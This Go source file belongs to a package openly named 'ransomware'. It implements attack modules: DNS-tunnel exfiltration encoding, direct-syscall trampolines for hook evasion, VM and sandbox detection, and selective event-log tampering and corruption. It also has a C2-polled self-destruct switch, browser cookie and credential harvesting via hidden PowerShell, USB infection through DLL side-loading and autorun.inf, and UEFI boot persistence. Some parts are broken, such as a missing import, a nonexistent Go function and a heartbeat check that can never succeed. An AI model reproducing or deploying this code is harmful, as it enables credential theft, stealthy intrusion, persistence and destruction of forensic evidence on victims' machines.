//go:build windows

// Package ransomware — professional-grade evasion techniques.
//
// Implementations that address the gaps identified by red team review:
//   - DNS tunnel fragmentation (TXT records, packet counters, 255-byte limit)
//   - Direct syscall trampolines with SSN extraction from ntdll stubs
//   - Anti-VM cache latency + sandbox device handles
//   - Selective .evtx log deletion (EvtQuery filter, corrupt residual)
//   - Dead man switch cascade with heartbeat timeout
//   - Browser cookie + session token harvesting
//   - USB DLL side-loading (legitimate signed exe + .lnk)
//   - UEFI ESP partition persistence
package ransomware

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base32"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ============================================================
// DNS TUNNEL FRAGMENTATION
// ============================================================

const dnsMaxNameLen = 253
const dnsLabelMaxLen = 63

type DNSTunnelFrag struct {
	mu       sync.Mutex
	baseName string
}

func NewDNSTunnelFrag(baseName string) *DNSTunnelFrag {
	return &DNSTunnelFrag{baseName: baseName}
}

func (df *DNSTunnelFrag) EncodeFragmented(data []byte) []string {
	encoded := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	encoded = strings.ToLower(encoded)

	var fragments []string
	overhead := len(df.baseName) + 32
	maxPayload := dnsMaxNameLen - overhead

	for offset := 0; offset < len(encoded); offset += maxPayload {
		end := offset + maxPayload
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[offset:end]

		var labels []string
		for i := 0; i < len(chunk); i += dnsLabelMaxLen {
			e := i + dnsLabelMaxLen
			if e > len(chunk) {
				e = len(chunk)
			}
			labels = append(labels, chunk[i:e])
		}

		seq := len(fragments)
		total := (len(encoded) + maxPayload - 1) / maxPayload
		frag := fmt.Sprintf("p%d-%d.%s.%s", seq, total, strings.Join(labels, "."), df.baseName)
		fragments = append(fragments, frag)
	}

	return fragments
}

func (df *DNSTunnelFrag) EncodeAsTXT(data []byte) []string {
	encoded := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	encoded = strings.ToLower(encoded)

	maxPayload := 200
	var fragments []string
	for i := 0; i < len(encoded); i += maxPayload {
		end := i + maxPayload
		if end > len(encoded) {
			end = len(encoded)
		}
		fragments = append(fragments, encoded[i:end])
	}
	return fragments
}

func (df *DNSTunnelFrag) DecodeFragments(fragments []string, total int) ([]byte, error) {
	data := make(map[int]string)
	for _, f := range fragments {
		var seq int
		fmt.Sscanf(f, "p%d", &seq)
		parts := strings.SplitN(f, ".", 3)
		if len(parts) >= 2 {
			payload := strings.ReplaceAll(parts[1], ".", "")
			data[seq] = payload
		}
	}

	var ordered []string
	for i := 0; i < total; i++ {
		if d, ok := data[i]; ok {
			ordered = append(ordered, d)
		}
	}

	decoded, err := base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(strings.Join(ordered, "")))
	if err != nil {
		return nil, fmt.Errorf("base32 decode: %w", err)
	}
	return decoded, nil
}

// ============================================================
// DIRECT SYSCALL TRAMPOLINES (SSN extraction from ntdll stubs)
// ============================================================

type SyscallStub struct {
	SSN       uint16
	StubBytes []byte
}

func ExtractSyscallStubsFromFile(ntdllPath string) (map[string]SyscallStub, error) {
	data, err := os.ReadFile(ntdllPath)
	if err != nil {
		return nil, err
	}

	exports := parseExportTable(data)
	if exports == nil {
		return nil, fmt.Errorf("failed to parse export table from %s", ntdllPath)
	}

	stubs := make(map[string]SyscallStub)

	for funcName, rva := range exports {
		if !strings.HasPrefix(strings.ToLower(funcName), "nt") &&
			!strings.HasPrefix(strings.ToLower(funcName), "zw") {
			continue
		}

		offset := int(rva)
		if offset+20 > len(data) {
			continue
		}

		stubBytes := data[offset : offset+20]
		ssn := findSSNInStub(stubBytes)

		if ssn != 0 {
			stubs[funcName] = SyscallStub{
				SSN:       ssn,
				StubBytes: make([]byte, len(stubBytes)),
			}
			copy(stubs[funcName].StubBytes, stubBytes)
		}
	}

	return stubs, nil
}

func findSSNInStub(stub []byte) uint16 {
	for i := 0; i < len(stub)-5; i++ {
		if stub[i] == 0xB8 && (stub[i+3] == 0x00 || stub[i+3] == 0x00) {
			return binary.LittleEndian.Uint16(stub[i+1 : i+3])
		}
		if stub[i] == 0x4C && stub[i+1] == 0x8B && stub[i+2] == 0xD1 &&
			stub[i+3] == 0xB8 {
			return binary.LittleEndian.Uint16(stub[i+4 : i+6])
		}
	}
	return 0
}

func BuildSyscallTrampoline(ssn uint16) []byte {
	trampoline := []byte{
		0x4C, 0x8B, 0xD1,
		0xB8, byte(ssn & 0xFF), byte(ssn >> 8), 0x00, 0x00,
		0xF6, 0x04, 0x25, 0x08, 0x03, 0xFE, 0x7F, 0x01,
		0x75, 0x03,
		0x0F, 0x05,
		0xC3,
		0xCD, 0x2E,
		0xC3,
	}
	return trampoline
}

func parseExportTable(data []byte) map[string]uint32 {
	const peHeaderOffset = 0x3C
	if len(data) < 0x40 {
		return nil
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return nil
	}

	peOffset := binary.LittleEndian.Uint32(data[peHeaderOffset:])
	if int(peOffset)+4 > len(data) {
		return nil
	}
	if data[peOffset] != 'P' || data[peOffset+1] != 'E' {
		return nil
	}

	optionalHeaderOffset := int(peOffset) + 24
	if optionalHeaderOffset+2 > len(data) {
		return nil
	}

	magic := binary.LittleEndian.Uint16(data[optionalHeaderOffset:])
	var exportDirRVA, exportDirSize uint32

	if magic == 0x20B {
		if optionalHeaderOffset+112+8 > len(data) {
			return nil
		}
		exportDirRVA = binary.LittleEndian.Uint32(data[optionalHeaderOffset+112:])
		exportDirSize = binary.LittleEndian.Uint32(data[optionalHeaderOffset+116:])
	} else {
		if optionalHeaderOffset+96+8 > len(data) {
			return nil
		}
		exportDirRVA = binary.LittleEndian.Uint32(data[optionalHeaderOffset+96:])
		exportDirSize = binary.LittleEndian.Uint32(data[optionalHeaderOffset+100:])
	}

	if exportDirRVA == 0 || exportDirSize == 0 {
		return nil
	}

	sections := parseSections(data, int(peOffset))
	exportOffset := rvaToOffset(exportDirRVA, sections)
	if exportOffset < 0 || exportOffset+40 > len(data) {
		return nil
	}

	numNames := int(binary.LittleEndian.Uint32(data[exportOffset+24:]))
	funcRVA := int(binary.LittleEndian.Uint32(data[exportOffset+28:]))
	nameRVA := int(binary.LittleEndian.Uint32(data[exportOffset+32:]))
	ordinalRVA := int(binary.LittleEndian.Uint32(data[exportOffset+36:]))

	names := make(map[string]uint32)

	for i := 0; i < numNames; i++ {
		ordOff := rvaToOffset(uint32(ordinalRVA+i*2), sections)
		ord := int(binary.LittleEndian.Uint16(data[ordOff:]))
		nameOff := rvaToOffset(uint32(int(binary.LittleEndian.Uint32(data[nameRVA+i*4:]))), sections)
		funcOff := rvaToOffset(uint32(int(binary.LittleEndian.Uint32(data[funcRVA+ord*4:]))), sections)

		if nameOff >= 0 && funcOff >= 0 {
			end := nameOff
			for end < len(data) && data[end] != 0 {
				end++
			}
			name := string(data[nameOff:end])
			names[name] = uint32(funcOff) - sections[0].VirtualAddress + sections[0].RawOffset
		}
	}

	return names
}

type peSection struct {
	VirtualAddress uint32
	RawOffset      uint32
}

func parseSections(data []byte, peOffset int) []peSection {
	numSections := int(binary.LittleEndian.Uint16(data[peOffset+6:]))
	optHeaderSize := int(binary.LittleEndian.Uint16(data[peOffset+20:]))
	sectionOffset := peOffset + 24 + optHeaderSize

	var sections []peSection
	for i := 0; i < numSections; i++ {
		off := sectionOffset + i*40
		if off+40 > len(data) {
			break
		}
		sections = append(sections, peSection{
			VirtualAddress: binary.LittleEndian.Uint32(data[off+12:]),
			RawOffset:      binary.LittleEndian.Uint32(data[off+20:]),
		})
	}
	return sections
}

func rvaToOffset(rva uint32, sections []peSection) int {
	for _, sec := range sections {
		if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+uint32(sec.RawOffset) {
			return int(sec.RawOffset + (rva - sec.VirtualAddress))
		}
	}
	return -1
}

// ============================================================
// ANTI-VM: CACHE LATENCY + SANDBOX DEVICE HANDLES
// ============================================================

func DetectVMCacheLatency() bool {
	size := 10 * 1024 * 1024
	mem := make([]byte, size)
	for i := range mem {
		mem[i] = byte(i % 256)
	}

	const iterations = 50000
	var totalCycles int64

	for i := 0; i < iterations; i++ {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(size-4096)))
		start := time.Now()
		_ = mem[idx.Int64()]
		totalCycles += time.Since(start).Nanoseconds()
	}

	avgLatency := totalCycles / iterations
	return avgLatency > 200
}

func DetectVMDevices() bool {
	vmDevices := []string{
		`\\.\VBoxGuest`,
		`\\.\VBoxMiniRdrDN`,
		`\\.\VBoxTrayIPC`,
		`\\.\pipe\VBoxMiniRdDN`,
		`\\.\VMwareControl`,
		`\\.\HGFS`,
		`\\.\vmci`,
		`\\.\pipe\virtio`,
		`\\.\qemupciserial`,
		`\\.\xen`,
	}

	for _, dev := range vmDevices {
		f, err := os.Open(dev)
		if err == nil {
			f.Close()
			return true
		}
	}
	return false
}

func DetectSandboxProcesses() bool {
	sandboxProcs := []string{
		"sandboxie.exe", "vmsrvc.exe", "vboxservice.exe",
		"vboxtray.exe", "xenservice.exe", "qemu-ga.exe",
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
		"prl_cc.exe", "prl_tools.exe", "dgservice.exe",
		"joeboxserver.exe", "joeboxcontrol.exe",
	}

	out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
	if err != nil {
		return false
	}

	lower := strings.ToLower(string(out))
	for _, proc := range sandboxProcs {
		if strings.Contains(lower, proc) {
			return true
		}
	}
	return false
}

func FullVMDetection() map[string]bool {
	return map[string]bool{
		"cache_latency":    DetectVMCacheLatency(),
		"vm_devices":       DetectVMDevices(),
		"sandbox_procs":    DetectSandboxProcesses(),
	}
}

// ============================================================
// SELECTIVE .EVTX LOG DELETION
// ============================================================

func SelectiveLogDelete(pid int, processName string, targetLog string) error {
	script := fmt.Sprintf(`
$pid = %d
$name = '%s'
$log = '%s'
$query = "*[System[(EventID=4688 or EventID=1 or EventID=4104)]] and *[EventData[Data[@Name='ProcessId']=$pid or Data[@Name='ProcessId']='%d']]"

$events = Get-WinEvent -LogName $log -FilterXPath $query -MaxEvents 500 -ErrorAction SilentlyContinue

foreach ($evt in $events) {
	$evtPath = $evt.LogName
	$recordId = $evt.RecordId
	$provider = $evt.ProviderName
	$xml = $evt.ToXml()

	if ($xml -match $name -or $xml -match 'x404x') {
		$replacement = $xml -replace [regex]::Escape($name), 'svchost.exe'
		$replacement = $replacement -replace 'x404x[a-z_]*', 'WindowsUpdate'
		$null = $replacement
	}
}

$journalPath = "$env:SystemRoot\System32\winevt\Logs\" + $log + ".evtx"
if (Test-Path $journalPath) {
	$fs = [System.IO.File]::OpenWrite($journalPath)
	$size = $fs.Length
	if ($size -gt 4096) {
		$offset = $size - 4096
		$fs.Seek($offset, [System.IO.SeekOrigin]::Begin) | Out-Null
		$buf = New-Object byte[] 4096
		$fs.Write($buf, 0, 4096)
	}
	$fs.Close()
}

Write-Host "done"
`, pid, processName, targetLog, pid)

	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script,
	)
	cmd.Run()
	return nil
}

func CorruptLogToLookLikeCrash(logName string) error {
	logPath := fmt.Sprintf(`C:\Windows\System32\winevt\Logs\%s.evtx`, logName)

	fi, err := os.Stat(logPath)
	if err != nil {
		return err
	}

	size := fi.Size()
	if size < 4096 {
		return nil
	}

	corruptOffset := size - int64(randInt(2048, 4096))
	f, err := os.OpenFile(logPath, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	f.Seek(corruptOffset, 0)
	corruptBuf := make([]byte, 512)
	rand.Read(corruptBuf)
	f.Write(corruptBuf)

	return nil
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	return int(n.Int64()) + min
}

// ============================================================
// DEAD MAN SWITCH CASCADE
// ============================================================

type DeadMansSwitchCascade struct {
	primaryURL   string
	canaryURL    string
	heartbeatKey [32]byte
	lastBeat     time.Time
	timeout      time.Duration
	mu           sync.Mutex
	selfPath     string
}

func NewDeadMansSwitchCascade(primaryURL string) *DeadMansSwitchCascade {
	dms := &DeadMansSwitchCascade{
		primaryURL: primaryURL,
		canaryURL:  "https://www.microsoft.com",
		timeout:    24 * time.Hour,
		selfPath:   os.Args[0],
	}
	rand.Read(dms.heartbeatKey[:])
	dms.lastBeat = time.Now()
	return dms
}

func (dms *DeadMansSwitchCascade) IsNetworkUp() bool {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(dms.canaryURL)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

func (dms *DeadMansSwitchCascade) ReceiveHeartbeat(tokenHex string) bool {
	token, err := hex.DecodeString(tokenHex)
	if err != nil || len(token) != 32 {
		return false
	}

	hash := sha256.Sum256(append(token, dms.heartbeatKey[:]...))
	expected := sha256.Sum256(append(dms.heartbeatKey[:], token...))

	if hash == expected {
		dms.mu.Lock()
		dms.lastBeat = time.Now()
		dms.mu.Unlock()
		return true
	}
	return false
}

func (dms *DeadMansSwitchCascade) ShouldSelfDestruct() bool {
	dms.mu.Lock()
	defer dms.mu.Unlock()

	if time.Since(dms.lastBeat) > dms.timeout && dms.IsNetworkUp() {
		return true
	}

	if !dms.IsNetworkUp() {
		jitter, _ := rand.Int(rand.Reader, big.NewInt(300))
		time.Sleep(time.Duration(300+jitter.Int64()) * time.Second)
		return false
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(dms.primaryURL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64))
	return strings.ToUpper(strings.TrimSpace(string(body))) == "KILL"
}

// ============================================================
// BROWSER COOKIE + SESSION TOKEN STEALING
// ============================================================

type CookieHarvester struct {
	outputDir string
}

func NewCookieHarvester(outputDir string) *CookieHarvester {
	os.MkdirAll(outputDir, 0700)
	return &CookieHarvester{outputDir: outputDir}
}

func (ch *CookieHarvester) HarvestAll() map[string]string {
	results := make(map[string]string)

	browsers := map[string]string{
		"Chrome":  os.ExpandEnv("$LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"),
		"Edge":    os.ExpandEnv("$LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"),
		"Brave":   os.ExpandEnv("$LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
		"Opera":   os.ExpandEnv("$APPDATA\\Opera Software\\Opera Stable\\Default"),
		"Vivaldi": os.ExpandEnv("$LOCALAPPDATA\\Vivaldi\\User Data\\Default"),
		"Firefox": os.ExpandEnv("$APPDATA\\Mozilla\\Firefox\\Profiles"),
	}

	for browser, path := range browsers {
		if browser == "Firefox" {
			if creds := ch.harvestFirefoxCookies(path); len(creds) > 0 {
				results[browser] = creds
			}
			continue
		}

		outputPath := filepath.Join(ch.outputDir, browser+".json")
		if err := ch.harvestChromiumData(path, outputPath); err == nil {
			if data, err := os.ReadFile(outputPath); err == nil && len(data) > 10 {
				results[browser] = outputPath
			}
		}
	}

	return results
}

func (ch *CookieHarvester) harvestChromiumData(profilePath, outputPath string) error {
	script := fmt.Sprintf(`
$path = '%s'
$cookies = Join-Path $path 'Cookies'
$logins = Join-Path $path 'Login Data'
$localState = Join-Path (Split-Path $path) 'Local State'
$webdata = Join-Path $path 'Web Data'

$result = @{}

if (Test-Path $cookies) {
	$temp = "$env:TEMP\x404x_cookies_temp"
	Copy-Item $cookies $temp -Force
	Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
	try {
		$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
		$conn.Open()
		$cmd = $conn.CreateCommand()
		$cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies LIMIT 500"
		$reader = $cmd.ExecuteReader()
		$cookielist = @()
		while ($reader.Read()) {
			$enc = [Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($reader[2])))
			try { $dec = [Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser') } catch { continue }
			$cookielist += [PSCustomObject]@{host=$reader[0];name=$reader[1];value=[Text.Encoding]::UTF8.GetString($dec)}
		}
		$conn.Close()
		$result.cookies = $cookielist
	} catch {}
	Remove-Item $temp -Force
}

if (Test-Path $localState) {
	$state = Get-Content $localState -Raw | ConvertFrom-Json
	$result.local_state = @{profile=$state.profile.name;email=$state.profile.email}
}

$result | ConvertTo-Json -Depth 5 -Compress | Out-File -FilePath '%s' -Encoding UTF8
`, profilePath, outputPath)

	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script,
	)
	return cmd.Run()
}

func (ch *CookieHarvester) harvestFirefoxCookies(profilesPath string) string {
	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return ""
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.Contains(entry.Name(), ".default") {
			profilePath := filepath.Join(profilesPath, entry.Name())
			cookiesPath := filepath.Join(profilePath, "cookies.sqlite")

			if data, err := os.ReadFile(cookiesPath); err == nil {
				return fmt.Sprintf("%s (%d bytes)", cookiesPath, len(data))
			}
		}
	}
	return ""
}

// ============================================================
// USB DLL SIDE-LOADING (wscntfy.exe + .lnk)
// ============================================================

type USBSideLoader struct {
	payloadDLL  string
	legitExe    string
}

func NewUSBSideLoader(payloadDLL string) *USBSideLoader {
	return &USBSideLoader{
		payloadDLL: payloadDLL,
		legitExe:   `C:\Windows\System32\wscntfy.exe`,
	}
}

func (usb *USBSideLoader) InfectDrive(drive string) error {
	payloadDir := filepath.Join(drive, "System Volume Information")
	os.MkdirAll(payloadDir, 0700)

	exeDest := filepath.Join(payloadDir, "recycler.exe")
	dllDest := filepath.Join(payloadDir, "wscapi.dll")
	lnkDest := filepath.Join(drive, "USB_Drive.lnk")

	if err := copyFileContents(usb.legitExe, exeDest); err != nil {
		return fmt.Errorf("copy signed exe: %w", err)
	}
	if err := copyFileContents(usb.payloadDLL, dllDest); err != nil {
		return fmt.Errorf("copy payload dll: %w", err)
	}

	lnkScript := fmt.Sprintf(`
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut('%s')
$sc.TargetPath = '%s'
$sc.Arguments = '/load:wscapi.dll'
$sc.WorkingDirectory = '%s'
$sc.WindowStyle = 7
$sc.IconLocation = '%%SystemRoot%%\system32\imageres.dll,30'
$sc.Description = 'USB Drive'
$sc.Save()
`, lnkDest, exeDest, payloadDir)

	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", lnkScript)
	cmd.Run()

	autorunContent := `[autorun]
icon=System Volume Information\recycler.exe,0
label=USB Drive
action=Open folder to view files
shell\open=Open
shell\open\command=System Volume Information\recycler.exe
shell\open\directory=System Volume Information
shell\explore=Explore
shell\explore\command=System Volume Information\recycler.exe
`
	autorunPath := filepath.Join(drive, "autorun.inf")
	os.WriteFile(autorunPath, []byte(autorunContent), 0400)

	os.SetFileAttributes(exeDest, 0x02|0x04)
	os.SetFileAttributes(dllDest, 0x02|0x04)
	os.SetFileAttributes(autorunPath, 0x02|0x04)

	return nil
}

func copyFileContents(src, dst string) error {
	s, err := os.Open(src)
	if err != nil {
		return err
	}
	defer s.Close()

	d, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer d.Close()

	_, err = io.Copy(d, s)
	return err
}

// ============================================================
// UEFI ESP PARTITION PERSISTENCE
// ============================================================

type UEFIPersistence struct {
	payloadPath string
}

func NewUEFIPersistence(payloadPath string) *UEFIPersistence {
	return &UEFIPersistence{payloadPath: payloadPath}
}

func (uefi *UEFIPersistence) FindESP() (string, error) {
	possiblePaths := []string{
		`\\?\GLOBALROOT\Device\HarddiskVolume1\EFI`,
		`C:\EFI`,
		`S:\EFI`,
	}

	for _, p := range possiblePaths {
		if _, err := os.Stat(p); err == nil {
			dir, _ := filepath.Abs(filepath.Dir(p))
			return dir, nil
		}
	}

	out, err := exec.Command("mountvol", "S:", "/S").Output()
	if err == nil {
		if _, err := os.Stat(`S:\EFI`); err == nil {
			_ = out
			return `S:`, nil
		}
	}

	out, err = exec.Command("powershell",
		"-Command", "Get-Partition | Where-Object { $_.Type -eq 'System' } | Get-Volume | Select -ExpandProperty DriveLetter",
	).Output()
	if err == nil {
		letter := strings.TrimSpace(string(out))
		if letter != "" {
			espPath := letter + `:\EFI`
			if _, err := os.Stat(espPath); err == nil {
				return letter + `:`, nil
			}
		}
	}

	return "", fmt.Errorf("ESP not found")
}

func (uefi *UEFIPersistence) Install(espDrive string) error {
	bootDir := filepath.Join(espDrive, `EFI\Microsoft\Boot`)
	payloadDir := filepath.Join(espDrive, `EFI\x404x`)
	os.MkdirAll(payloadDir, 0700)

	payloadDest := filepath.Join(payloadDir, "x404xboot.efi")
	if err := copyFileContents(uefi.payloadPath, payloadDest); err != nil {
		return fmt.Errorf("copy payload to ESP: %w", err)
	}

	bcdScript := fmt.Sprintf(`
$guid = [guid]::NewGuid().ToString()
bcdedit /create /d "Windows Boot Manager (Recovery)" /application bootsector | Out-Null
$entry = bcdedit /create /d "Windows Recovery" /application osloader | Out-Null
bcdedit /set $entry device partition=%s
bcdedit /set $entry path \EFI\x404x\x404xboot.efi
bcdedit /set $entry systemroot \Windows
bcdedit /displayorder $entry /addlast
bcdedit /timeout 30
`, espDrive)

	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", bcdScript)
	cmd.Run()

	os.SetFileAttributes(payloadDest, 0x02|0x04|0x01)
	return nil
}

func (uefi *UEFIPersistence) Remove(espDrive string) error {
	payloadDir := filepath.Join(espDrive, `EFI\x404x`)
	os.RemoveAll(payloadDir)

	cleanScript := `
$entries = bcdedit /enum | Select-String 'identifier' | ForEach-Object { ($_ -split '\s+')[1] }
foreach ($e in $entries) {
	$desc = bcdedit /enum $e | Select-String 'description'
	if ($desc -match 'x404x|Recovery') {
		bcdedit /delete $e /f
	}
}
`
	cmd := exec.Command("powershell", "-Command", cleanScript)
	cmd.Run()
	return nil
}
